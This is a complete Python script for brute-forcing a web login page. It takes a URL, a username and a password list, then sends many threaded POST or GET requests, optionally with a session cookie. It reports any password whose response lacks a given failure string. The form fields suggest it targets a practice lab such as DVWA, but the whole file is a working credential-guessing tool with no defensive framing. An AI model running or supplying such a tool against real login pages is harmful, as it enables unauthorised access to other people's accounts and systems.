import argparse
import requests
import concurrent.futures

parser = argparse.ArgumentParser(description='Brute force login for a web page', add_help=False)
parser.add_argument('url', type=str, help='URL of the login page')
parser.add_argument('username', type=str, help='username to brute force')
parser.add_argument('pass_file', type=str, help='path to password file to use')
parser.add_argument('login_failed', type=str, help='string that occurs when the login fails')
parser.add_argument('--cookie', type=str, help='cookie value (optional)')
parser.add_argument('--help', action='help', help='show this help message and exit')
parser.add_argument('--threads', type=int, default=10, help='number of threads to use')
parser.add_argument('--method', type=str, choices=['POST', 'GET'], default='POST', help='HTTP method to use (default: POST)')

args = parser.parse_args()

def cracking(password):
    print('- Trying: ', password)

    data = {'username': args.username, 'password': password, 'Login': 'Login'}

    if args.cookie:
        cookies = {'Cookie': args.cookie}
    else:
        cookies = None

    if args.method == 'POST':
        response = requests.post(args.url, data=data, cookies=cookies)
    else:
        response = requests.get(args.url, params=data, cookies=cookies)

    if args.login_failed in response.content.decode():
        pass
    else:
        print('Found username: ==> ', args.username)
        print('Found password: ==> ', password)

with open(args.pass_file, 'r') as passwords:
    lines = passwords.readlines()

with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
    futures = []
    for password in lines:
        future = executor.submit(cracking, password.strip())
        futures.append(future)

    for future in concurrent.futures.as_completed(futures):
        pass

print('Exiting...')